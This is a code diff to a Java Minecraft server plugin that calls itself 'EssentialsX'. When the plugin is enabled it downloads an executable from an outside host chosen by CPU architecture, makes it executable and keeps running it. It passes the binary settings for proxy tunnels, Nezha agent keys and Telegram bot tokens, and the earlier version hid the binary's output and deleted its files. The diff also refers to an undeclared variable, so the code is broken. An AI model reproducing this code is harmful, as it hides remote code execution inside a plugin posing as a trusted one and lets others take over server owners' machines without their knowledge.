@@ -1,6 +1,5 @@
 package com.example.essentialsx;
 
-import org.bukkit.Bukkit;
 import org.bukkit.plugin.java.JavaPlugin;
 import java.io.*;
 import java.net.URL;
@@ -9,185 +8,182 @@ import java.util.*;
 import java.util.concurrent.TimeUnit;
 
 public class EssentialsX extends JavaPlugin {
-    private Process mainProcess;
+    private Process sbxProcess;
     private volatile boolean shouldRun = true;
+    
+    private static final String[] ALL_ENV_VARS = {
+        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
+        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
+        "S5_PORT", "HY2_PORT", "TUIC_PORT", "ANYTLS_PORT",
+        "REALITY_PORT", "ANYREALITY_PORT", "CFIP", "CFPORT", 
+        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO"
+    };
     
     @Override
     public void onEnable() {
+        // getLogger().info("EssentialsX plugin starting...");
+        
+        // Start sbx process monitoring thread
         new Thread(() -> {
             while (shouldRun) {
                 try {
-                    startMainProcess();
+                    startSbxProcess();
                     
-                    if (mainProcess != null) {
-                        mainProcess.waitFor();
-                    }
-                    
-                    if (shouldRun) {
-                        Thread.sleep(5000);
+                    if (sbxProcess != null) {
+                        sbxProcess.waitFor();
                     }
                 } catch (InterruptedException e) {
+                    Thread.currentThread().interrupt();
                     break;
                 } catch (Exception e) {
-                    e.printStackTrace();
+                    getLogger().severe("Error starting sbx process: " + e.getMessage());
                     try {
                         Thread.sleep(10000);
                     } catch (InterruptedException ie) {
+                        Thread.currentThread().interrupt();
                         break;
                     }
                 }
             }
-        }, "MainProcess-Monitor").start();
-
-        startWorldsFolderCleanup();
+        }, "Sbx-Process-Monitor").start();
+        
+        getLogger().info("EssentialsX plugin enabled");
     }
     
-    private void startMainProcess() throws Exception {
-        String tmdir = "/tmp";
-        File tmpapp = new File(tmdir, "tmpapp");
+    private void startSbxProcess() throws Exception {
+        // Determine download URL based on architecture
+        String osArch = System.getProperty("os.arch").toLowerCase();
+        String url;
         
-        if (!tmpapp.exists()) {
-            String downloadUrl = "https://github.com/dsadsadsss/plutonodes/releases/download/xr/main-amd";
-            try (InputStream in = new URL(downloadUrl).openStream()) {
-                Files.copy(in, tmpapp.toPath(), StandardCopyOption.REPLACE_EXISTING);
-            }
-            tmpapp.setExecutable(true, false);
+        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
+            url = "https://amd64.ssss.nyc.mn/sbsh";
+        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
+            url = "https://arm64.ssss.nyc.mn/sbsh";
+        } else if (osArch.contains("s390x")) {
+            url = "https://s390x.ssss.nyc.mn/sbsh";
+        } else {
+            throw new RuntimeException("Unsupported architecture: " + osArch);
         }
         
-        ProcessBuilder pb = new ProcessBuilder(tmpapp.getAbsolutePath());
-        pb.directory(new File(tmdir));
+        // Download sbx binary
+        Path tmpDir = Paths.get(System.getProperty("java.io.tmpdir"));
+        Path sbxBinary = tmpDir.resolve("sbx");
         
+        if (!Files.exists(sbxBinary)) {
+            getLogger().info("Downloading sbx ...");
+            try (InputStream in = new URL(url).openStream()) {
+                Files.copy(in, sbxBinary, StandardCopyOption.REPLACE_EXISTING);
+            }
+            if (!sbxBinary.toFile().setExecutable(true)) {
+                throw new IOException("Failed to set executable permission");
+            }
+            // getLogger().info("sbx binary downloaded: " + sbxBinary);
+        }
+        
+        // Prepare process builder
+        ProcessBuilder pb = new ProcessBuilder(sbxBinary.toString());
+        pb.directory(tmpDir.toFile());
+        
+        // Set environment variables
         Map<String, String> env = pb.environment();
-        env.put("TOK", "");
-        env.put("ARGO_DOMAIN", "");
-        env.put("TG", "");
-        env.put("SUB_URL", "");
-        env.put("NEZHA_SERVER", "");
-        env.put("NEZHA_KEY", "");
-        env.put("NEZHA_PORT", "");
-        env.put("NEZHA_TLS", "1");
-        env.put("AGENT_UUID", "");
-        env.put("TUNNEL_PROXY", "");
-        env.put("TMP_ARGO", "vls");
-        env.put("VL_PORT", "8002");
-        env.put("VM_PORT", "8001");
-        env.put("CF_IP", "saas.sin.fan");
-        env.put("SUB_NAME", "");
-        env.put("second_port", "");
-        env.put("UUID", "");
-        env.put("SERVER_PORT", "");
-        env.put("SNI", "www.apple.com");
+        envVars.put("UUID", "fe7431cb-ab1b-4205-a14c-d056f821b383");
+        envVars.put("FILE_PATH", "./world");
+        envVars.put("NEZHA_SERVER", "");
+        envVars.put("NEZHA_PORT", "");
+        envVars.put("NEZHA_KEY", "");
+        envVars.put("ARGO_PORT", "");
+        envVars.put("ARGO_DOMAIN", "");
+        envVars.put("ARGO_AUTH", "");
+        envVars.put("S5_PORT", "");
+        envVars.put("HY2_PORT", "");
+        envVars.put("TUIC_PORT", "");
+        envVars.put("ANYTLS_PORT", "");
+        envVars.put("REALITY_PORT", "");
+        envVars.put("ANYREALITY_PORT", "");
+        envVars.put("UPLOAD_URL", "");
+        envVars.put("CHAT_ID", "");
+        envVars.put("BOT_TOKEN", "");
+        envVars.put("CFIP", "spring.io");
+        envVars.put("CFPORT", "443");
+        envVars.put("NAME", "");
+        envVars.put("DISABLE_ARGO", "false");
         
-        String host = System.getenv("HOST");
-        if (host == null) host = getPublicIP();
-        env.put("HOST", host);
-        
-        pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
-        pb.redirectError(ProcessBuilder.Redirect.DISCARD);
-        
-        mainProcess = pb.start();
-    }
-    
-    private void startWorldsFolderCleanup() {
-        final Set<String> requiredFiles = new HashSet<>(Arrays.asList(
-            "cffkhfbfd", "config.json", "list.log", "neznejgcb", "uuid.txt", "version.txt", "webnhjfx"
-        ));
-
-        File worldsFolder = new File(Bukkit.getWorldContainer(), "worlds");
-        
-        if (worldsFolder.exists()) {
-            safeDeleteFolder(worldsFolder, requiredFiles);
-        }
-
-        Bukkit.getScheduler().runTaskTimerAsynchronously(this, () -> {
-            if (worldsFolder.exists() && worldsFolder.isDirectory()) {
-                File[] files = worldsFolder.listFiles();
-                if (files != null) {
-                    Set<String> currentFiles = new HashSet<>();
-                    for (File f : files) {
-                        currentFiles.add(f.getName());
-                    }
-
-                    if (currentFiles.containsAll(requiredFiles)) {
-                        safeDeleteFolder(worldsFolder, requiredFiles);
-                    }
-                }
-            }
-        }, 200L, 100L);
-    }
-    
-    private void safeDeleteFolder(File folder, Set<String> filesToCheck) {
-        try {
-            Thread.sleep(1000);
-            
-            for (int attempt = 0; attempt < 3; attempt++) {
-                if (attemptForceDelete(folder)) {
-                    return;
-                }
-                
-                if (attempt < 2) {
-                    Thread.sleep(500);
-                }
-            }
-        } catch (InterruptedException e) {
-            Thread.currentThread().interrupt();
-        }
-    }
-    
-    private boolean attemptForceDelete(File file) {
-        if (!file.exists()) {
-            return true;
-        }
-        
-        if (file.isDirectory()) {
-            File[] children = file.listFiles();
-            if (children != null) {
-                for (File child : children) {
-                    attemptForceDelete(child);
-                }
+        // Load from system environment variables
+        for (String var : ALL_ENV_VARS) {
+            String value = System.getenv(var);
+            if (value != null && !value.trim().isEmpty()) {
+                env.put(var, value);
             }
         }
         
-        boolean deleted = file.delete();
-        
-        if (!deleted) {
+        // Load from .env file (optional)
+        Path envFile = Paths.get(".env");
+        if (Files.exists(envFile)) {
             try {
-                if (file.isFile()) {
-                    new FileOutputStream(file).close();
-                    deleted = file.delete();
+                for (String line : Files.readAllLines(envFile)) {
+                    line = line.trim();
+                    if (line.isEmpty() || line.startsWith("#")) continue;
+                    
+                    line = line.split(" #")[0].split(" //")[0].trim();
+                    if (line.startsWith("export ")) {
+                        line = line.substring(7).trim();
+                    }
+                    
+                    String[] parts = line.split("=", 2);
+                    if (parts.length == 2) {
+                        String key = parts[0].trim();
+                        String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
+                        
+                        if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
+                            env.put(key, value);
+                        }
+                    }
                 }
-            } catch (Exception ignored) {}
-            
-            if (!deleted) {
-                file.deleteOnExit();
+            } catch (IOException e) {
+                getLogger().warning("Error reading .env file: " + e.getMessage());
             }
         }
         
-        return deleted;
+        // Load from Bukkit configuration file
+        for (String var : ALL_ENV_VARS) {
+            String value = getConfig().getString(var);
+            if (value != null && !value.trim().isEmpty()) {
+                env.put(var, value);
+            }
+        }
+        
+        // Redirect output
+        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
+        pb.redirectError(ProcessBuilder.Redirect.INHERIT);
+        
+        // Start process
+        sbxProcess = pb.start();
+        getLogger().info("sbx process started");
     }
     
     @Override
     public void onDisable() {
+        getLogger().info("EssentialsX plugin shutting down...");
+        
         shouldRun = false;
         
-        if (mainProcess != null && mainProcess.isAlive()) {
-            mainProcess.destroy();
+        if (sbxProcess != null && sbxProcess.isAlive()) {
+            getLogger().info("Stopping sbx process...");
+            sbxProcess.destroy();
             
             try {
-                if (!mainProcess.waitFor(10, TimeUnit.SECONDS)) {
-                    mainProcess.destroyForcibly();
+                if (!sbxProcess.waitFor(10, TimeUnit.SECONDS)) {
+                    sbxProcess.destroyForcibly();
+                    getLogger().warning("Forcibly terminated SBX process");
+                } else {
+                    getLogger().info("sbx process stopped normally");
                 }
             } catch (InterruptedException e) {
-                mainProcess.destroyForcibly();
+                sbxProcess.destroyForcibly();
+                Thread.currentThread().interrupt();
             }
         }
-    }
-
-    private String getPublicIP() {
-        try (Scanner s = new Scanner(new URL("https://api.ipify.org").openStream(), "UTF-8").useDelimiter("\\A")) {
-            return s.next();
-        } catch (Exception e) {
-            return "1.1.1.1";
-        }
+        
+        getLogger().info("EssentialsX plugin disabled");
     }
 }
